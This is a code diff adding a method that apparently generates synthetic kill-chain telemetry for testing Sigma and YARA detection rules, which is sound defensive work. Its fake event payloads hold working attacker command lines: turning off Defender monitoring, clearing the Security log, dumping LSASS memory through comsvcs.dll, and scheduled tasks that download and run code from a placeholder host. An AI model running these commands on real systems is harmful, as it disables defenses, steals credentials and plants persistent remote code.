@@ -246,3 +246,121 @@ class PromptEngine:
         ]
         desc, prompt = templates[index % len(templates)]
         return prompt, self.generate_from_prompt(prompt, target_type="sigma")
+
+    def generate_stage_variant(
+        self, stage: int, cycle: int = 1, evasive: bool = False
+    ) -> Tuple[str, str, str, Variant]:
+        """Generates a synthetic variant tailored for a specific kill chain stage."""
+        var_id = f"stage{stage}-{uuid.uuid4().hex[:8]}"
+
+        if stage == 1:
+            stage_name = "Initial Access"
+            tactic = "Initial Access"
+            technique_id = "T1566.001"
+            if evasive:
+                prompt = "Test SVG foreignObject containing HTML meta-refresh redirect to external URL"
+            else:
+                prompt = "SVG image redirecting on load via location.replace to auth.stage.invalid"
+            variant = self.generate_from_prompt(prompt, target_type="yara")
+            variant.id = var_id
+            variant.cycle = cycle
+            return stage_name, tactic, technique_id, variant
+
+        elif stage == 2:
+            stage_name = "Execution"
+            tactic = "Execution"
+            technique_id = "T1204.002"
+            if evasive:
+                prompt = "Simulate Explorer launching pcalua.exe to proxy powershell download"
+            else:
+                prompt = "Test Explorer launching PowerShell hidden downloadstring cradle"
+            variant = self.generate_from_prompt(prompt, target_type="sigma")
+            variant.id = var_id
+            variant.cycle = cycle
+            return stage_name, tactic, technique_id, variant
+
+        elif stage == 3:
+            stage_name = "Defense Evasion"
+            tactic = "Defense Evasion"
+            technique_id = "T1070.001"
+            if evasive:
+                cmd = "powershell.exe -w hidden -c Set-MpPreference -DisableRealtimeMonitoring $true"
+                image = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+            else:
+                cmd = "wevtutil.exe cl Security"
+                image = "C:\\Windows\\System32\\wevtutil.exe"
+
+            payload = {
+                "EventID": 1,
+                "UtcTime": "2026-09-03 14:00:00.000",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "Image": image,
+                "CommandLine": cmd,
+                "User": "VICTIM-PC\\analyst",
+            }
+            variant = Variant(
+                id=var_id,
+                target_type="sigma",
+                axis="tampering" if evasive else "log_clearing",
+                mutation_name="tamper_defense" if evasive else "clear_eventlog",
+                description="Simulate post-compromise defense evasion",
+                payload=payload,
+                cycle=cycle,
+            )
+            return stage_name, tactic, technique_id, variant
+
+        elif stage == 4:
+            stage_name = "Credential Access"
+            tactic = "Credential Access"
+            technique_id = "T1003.001"
+            if evasive:
+                cmd = "rundll32.exe comsvcs.dll, #24 624 C:\\Users\\analyst\\AppData\\Local\\Temp\\dump.bin full"
+            else:
+                cmd = "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full"
+
+            payload = {
+                "EventID": 1,
+                "UtcTime": "2026-09-03 14:00:05.000",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "Image": "C:\\Windows\\System32\\rundll32.exe",
+                "CommandLine": cmd,
+                "User": "NT AUTHORITY\\SYSTEM",
+            }
+            variant = Variant(
+                id=var_id,
+                target_type="sigma",
+                axis="ordinal_invoke" if evasive else "named_export",
+                mutation_name="comsvcs_ordinal" if evasive else "comsvcs_minidump",
+                description="Simulate LSASS memory dumping via comsvcs.dll",
+                payload=payload,
+                cycle=cycle,
+            )
+            return stage_name, tactic, technique_id, variant
+
+        else:  # stage == 5
+            stage_name = "Persistence"
+            tactic = "Persistence"
+            technique_id = "T1053.005"
+            if evasive:
+                cmd = 'schtasks.exe /create /tn "SystemHealth" /tr "cmd.exe /c curl.exe https://cdn.stage.invalid/p.bin -o %TEMP%\\p.exe" /sc minute /mo 15'
+            else:
+                cmd = 'schtasks.exe /create /tn "OneDrive Update" /tr "powershell.exe -w hidden -c irm https://cdn.stage.invalid/update.ps1 | iex" /sc onlogon /ru SYSTEM'
+
+            payload = {
+                "EventID": 1,
+                "UtcTime": "2026-09-03 14:00:10.000",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "Image": "C:\\Windows\\System32\\schtasks.exe",
+                "CommandLine": cmd,
+                "User": "NT AUTHORITY\\SYSTEM",
+            }
+            variant = Variant(
+                id=var_id,
+                target_type="sigma",
+                axis="recurring_minute" if evasive else "logon_trigger",
+                mutation_name="schtasks_minute" if evasive else "schtasks_onlogon",
+                description="Simulate scheduled task persistence creation",
+                payload=payload,
+                cycle=cycle,
+            )
+            return stage_name, tactic, technique_id, variant
